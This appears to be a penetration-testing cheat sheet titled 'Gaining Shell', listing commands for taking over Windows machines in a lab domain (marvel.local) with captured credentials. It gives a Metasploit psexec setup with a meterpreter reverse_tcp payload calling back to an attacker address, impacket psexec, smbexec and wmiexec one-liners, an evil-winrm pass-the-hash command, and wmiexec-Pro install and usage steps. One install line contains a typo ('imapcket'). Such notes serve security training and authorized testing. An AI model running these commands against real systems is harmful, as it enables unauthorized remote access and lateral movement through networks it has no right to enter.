- - -
## Gaining Shell : 
( **This is not the end there are more** )

#### Metasploit : 

```sh
# msfconsole 
msf5> search psexec 
msf5> use exploit/windows/smb/psexec 
msf5> set RHOSTS 
msf5> set SMBDomain marvel.local 
msf5> set SMBPass P@$$w0rd 
msf5> set SMBUser Thor 
msf5> set payload windows/x64/meterpreter/reverse_tcp 
msf5> set LHOST 10.8.78.38 
msf5> exploit 
```

Sometimes it will not work in first time, try again few times : 

```sh
msf5> show targets 
msf5> set target 2 
msf5> run 
```

#### Psexec : 

```python
psexec.py marvel.local/Thor:P@$$w0rd@10.10.10.10 
```

#### Smbexec : 

```python
smbexec.py marvel.local/Thor:P@$$w0rd@10.10.10.10 
```

#### Wmiexec : 

```python
wmiexec.py marvel.local/Thor:P@$$w0rd@10.10.10.10 
```

#### Evil-Winrm :  

```python
evil-winrm -u Administrator -H 3f3ef89114fb063e3d7fc23c20f65568 -i 10.10.162.183
```

#### Wmicexec-Pro : 

Installation
```sh
git clone https://github.com/fortra/impacket ; cd imapcket && sudo pip3 install .
git clone https://github.com/XiaoliChan/wmiexec-Pro
```

**[Usage](https://github.com/XiaoliChan/wmiexec-Pro#usage)**
```python
python3 wmiexec-pro.py administrator:password@192.168.1.1 exec-command -command "whoami" -with-output
# There are many more uses, please  check the usage and help section.
```

- - -
